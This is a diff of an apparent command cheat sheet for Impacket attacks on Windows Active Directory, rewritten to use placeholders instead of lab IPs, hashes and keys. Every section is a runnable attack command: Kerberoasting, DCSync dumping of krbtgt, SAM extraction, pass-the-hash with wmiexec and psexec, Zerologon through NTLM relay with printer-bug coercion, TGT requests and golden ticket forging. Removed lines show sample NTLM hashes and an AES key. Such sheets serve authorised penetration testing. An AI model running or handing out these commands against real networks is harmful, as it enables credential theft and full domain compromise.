@@ -1,33 +1,39 @@
-% impacket
-# Kerberoast
-GetUserSPNs.py -request -dc-ip [IP address for Domain Controller] cyberpunk.com/[USER]
+% kerberos,kerberoast,dcsync,samdump,wmiexec,psexec,ntlmrelay,zerologon,ticketer,gettgt,impacket
 
-# DCSync
-secretsdump.py -just-dc-user [ACCOUNT] [DOMAIN]/[USERNAME]:[PASSWORD]@[TARGET]
-secretsdump.py 'contoso.local/Administrator@192.168.100.2' -just-dc-user krbtgt
+# Kerberoast: GetUserSPNs
+python3 GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>
+
+# DCSync attack (specific user)
+secretsdump.py -just-dc-user <account> <domain>/<username>:<password>@<target>
+
+# DCSync (example)
+secretsdump.py '<domain>/<username>@<target>' -just-dc-user krbtgt
 
 # Dump local SAM file
-secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+secretsdump.py -sam <sam.save> -security <security.save> -system <system.save> LOCAL
 
-# WMIExec
-impacket-wmiexec n.glover@10.10.120.1
-impacket-wmiexec -hashes AAD3B435B51404EEAAD3B435B51404EE:a6a6591a1fef4938ce2ca6ea255838a9 n.glover@10.10.120.1
+# WMIExec (with and without NTLM hash)
+impacket-wmiexec <user>@<target_ip>
+impacket-wmiexec -hashes <LM>:<NT> <user>@<target_ip>
 
-# Zerologon using NTLM Relay:
-impacket-ntlmrelayx -t DCSYNC://<DCvulnerabletoZL> -smb2support -auth-smb 'DOMAIN/USER:PASSWORD'
-python3 printerbug.py 'DOMAIN/USER:PASSWORD@<OtherDC>' <attackerIP
+# Zerologon via NTLM Relay
+impacket-ntlmrelayx -t DCSYNC://<dc_name> -smb2support -auth-smb '<domain>/<user>:<password>'
+python3 printerbug.py '<domain>/<user>:<password>@<other_dc>' <attacker_ip>
 
-# PSExec
-psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
+# PSExec with NTLM hash
+psexec.py <domain>/<user>@<target_ip> -hashes :<ntlm_hash>
 
-# getTGT
-getTGT.py contoso.local/Anakin -dc-ip 192.168.100.2 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
-export KRB5CCNAME=$(pwd)/Anakin.ccache
-psexec.py contoso.local/Anakin@WS01-10 -target-ip 192.168.100.10 -k -no-pass
-Must use hostname instead of IP; Kerberos requires it to determine the correct service
+# getTGT (Kerberos TGT with NTLM hash)
+getTGT.py <domain>/<user> -dc-ip <dc_ip> -hashes :<ntlm_hash>
 
-# NTLMRelayX
-ntlmrelayx.py -t 192.168.100.10 -smb2support
+# Set Kerberos TGT cache
+export KRB5CCNAME=$(pwd)/<user>.ccache
 
-# Ticketer
-ticketer.py -domain-sid S-1-5-21-1372086773-2238746523-2939299801 -domain contoso.local Administrator -aes 5249e3cf829c979959286c0ee145b7e6b8b8589287bea3c83dd5c9488c40f162
+# Use cached TGT with PSExec (hostname required)
+psexec.py <domain>/<user>@<hostname> -target-ip <target_ip> -k -no-pass
+
+# NTLMRelayX basic relay
+ntlmrelayx.py -t <target_ip> -smb2support
+
+# Ticketer (Golden Ticket with AES-256)
+ticketer.py -domain-sid <domain_sid> -domain <domain> <user> -aes <aes256_hash>
